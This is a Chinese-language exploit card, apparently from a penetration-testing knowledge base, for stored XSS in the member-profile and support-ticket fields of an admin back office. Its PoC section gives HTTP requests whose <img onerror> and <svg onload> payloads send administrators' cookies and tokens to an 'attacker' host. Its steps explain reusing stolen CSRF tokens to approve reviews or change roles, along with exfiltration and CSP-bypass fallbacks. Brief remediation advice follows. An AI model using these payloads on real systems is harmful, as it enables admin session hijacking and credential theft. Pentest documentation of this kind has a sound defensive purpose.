---
title: 会员资料存储型 XSS 打后台审核（管理员会话劫持）
cve: 无（实现缺陷）
severity: high
cvss: 8.2
product: 自研后台（客服/审核/风控页）
versions: 任意
ports: 80, 443
keywords: stored xss, 存储型, 后台, 审核, cookie, csrf
entry: 昵称/备注/工单里插 <img onerror>
verified: false
sources: 公开资料整理（实现缺陷类，无 CVE）
---

## 指纹

- 会员可控字段会显示在后台列表/详情里：昵称、真实姓名、备注、工单内容、充值凭证文件名、代理推广语。
- 后台页面无 CSP，或 CSP 允许内联。

## 前置条件

- 普通账号；知道后台有人工审核动作（提现审核、实名审核、工单回复）。

## PoC

```http
### 1) 把 payload 写进昵称/备注
POST /api/user/update HTTP/1.1
Content-Type: application/json

{"nickname":"<img src=x onerror=fetch('//attacker/c?'+document.cookie)>"}

### 2) 工单/留言（更容易被客服点开）
POST /api/support/ticket HTTP/1.1

{"title":"<svg onload=fetch('//attacker/c?'+localStorage.token)>","content":"hi"}
```

## 利用步骤

1. 依次在各字段写入带 `onerror`/`onload` 的 payload，并记录写到了哪个页面会展示。
2. 用自己另一个"后台视角"（若有测试后台）或观察客服响应时间，确认是否被打开。
3. 命中后偷：`document.cookie`、`localStorage.token`、后台页面的 CSRF token，再用它打"审核通过/改角色"接口。
4. 无回连时用 DOM 型外带（`new Image().src`）或 `fetch` 带 Referer；CSP 严时找同域 JSONP/上传点。
5. 证据：payload 字段 + 后台页面截图/回连日志；只打自己的审核单。

## 修复与缓解

- 输出编码（按上下文）+ 富文本白名单；CSP `default-src 'self'` 且禁内联。
- 后台 Cookie 加 `HttpOnly` + `SameSite=Strict`；敏感操作二次验证。
- 审核页对用户内容做纯文本渲染。

## 参考

- OWASP XSS Prevention Cheat Sheet；OWASP WSTG-INPV-02。
